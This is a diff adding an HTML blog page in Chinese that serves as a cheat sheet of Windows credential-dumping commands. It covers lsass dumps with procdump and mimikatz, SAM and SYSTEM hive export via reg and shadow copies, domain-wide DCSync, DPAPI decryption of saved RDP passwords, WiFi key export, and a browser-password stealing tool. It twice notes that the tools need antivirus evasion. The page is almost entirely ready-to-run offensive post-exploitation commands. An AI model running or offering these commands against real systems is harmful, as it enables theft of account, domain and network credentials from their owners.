@@ -1,0 +1,40 @@
+<!DOCTYPE html><html lang="zh"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=0.5"><link rel="stylesheet" href="/css/post.css"><link rel="icon" href="/img/favicon.png"><title>凭证导出</title><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body>　　<div class="inner"><h2>凭证导出</h2><p>记录一些Windows凭证导出tips</p>
+<h1 id="0x1-离线导出Hash"><a href="#0x1-离线导出Hash" class="headerlink" title="0x1 离线导出Hash"></a>0x1 离线导出Hash</h1><h2 id="0x1-1-procdump"><a href="#0x1-1-procdump" class="headerlink" title="0x1.1 procdump"></a>0x1.1 procdump</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe-accepteula -ma lsass.exe lsass.dmp</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> mimikatz解析</span></span><br><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswordsfull&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x1-2-reg"><a href="#0x1-2-reg" class="headerlink" title="0x1.2 reg"></a>0x1.2 reg</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM SystemBkup.hiv </span><br><span class="line">reg save HKLM\SAM SamBkup.hiv</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> mimikatz 解析</span></span><br><span class="line">lsadump::sam /sam:SystemBkup.hiv /system:SamBkup.hiv</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x1-3-影卷复制"><a href="#0x1-3-影卷复制" class="headerlink" title="0x1.3 影卷复制"></a>0x1.3 影卷复制</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vssadmin create shadow /for=C:</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\sam.save</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system.save</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x2-在线导出Hash-密码"><a href="#0x2-在线导出Hash-密码" class="headerlink" title="0x2 在线导出Hash/密码"></a>0x2 在线导出Hash/密码</h1><h2 id="0x2-1-在线导出本地hash-密码"><a href="#0x2-1-在线导出本地hash-密码" class="headerlink" title="0x2.1 在线导出本地hash/密码"></a>0x2.1 在线导出本地hash/密码</h2><p>主要是dump lsass进程，mimikatz需要免杀处理</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x2-2-网络导出域控hash"><a href="#0x2-2-网络导出域控hash" class="headerlink" title="0x2.2 网络导出域控hash"></a>0x2.2 网络导出域控hash</h2><p>需要有dcsync的权限，可以通过ldap的acl搜索</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # lsadump::dcsync /domain:test.com /all /csv</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="0x3-rdp相关"><a href="#0x3-rdp相关" class="headerlink" title="0x3. rdp相关"></a>0x3. rdp相关</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看本地连接过哪些rdp</span></span><br><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; /s</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看保存在本地的远程主机信息</span></span><br><span class="line">cmdkey /list</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看本地是否存在RDP密码文件</span></span><br><span class="line">dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*</span><br><span class="line"><span class="meta">#</span><span class="bash">解析</span></span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\8781378F7D47006A4FC98D2F8A266F58</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">根据guidMasterKey找到对应的Masterkey</span></span><br><span class="line">mimikatz # sekurlsa::dpapi</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 通过Masterkey解密出明文RDP连接密码。</span></span><br><span class="line">mimikatz # dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\8781378F7D47006A4FC98D2F8A266F58 /masterkey:1df6b7a86b7aa3238c6899b1b4fd7b4ccba852db9b2ea611bbb7943f34b788f55d27835591ccde1e6c643d9aca724fd495282f5fc92ee80746262d8759b9d23d</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="0x4-Wifi"><a href="#0x4-Wifi" class="headerlink" title="0x4 Wifi"></a>0x4 Wifi</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">查wifi名称</span></span><br><span class="line">netsh wlan show profile </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">导出wifi密码</span></span><br><span class="line">netsh wlan show profile ChinaNet-4GDLZ8 key=clear</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="0x5-浏览器密码"><a href="#0x5-浏览器密码" class="headerlink" title="0x5 浏览器密码"></a>0x5 浏览器密码</h1><p>需要免杀处理一下</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a></p>
+</div><script src="/js/jquery.min.js"></script><script src="/js/main.js"></script></body></html>
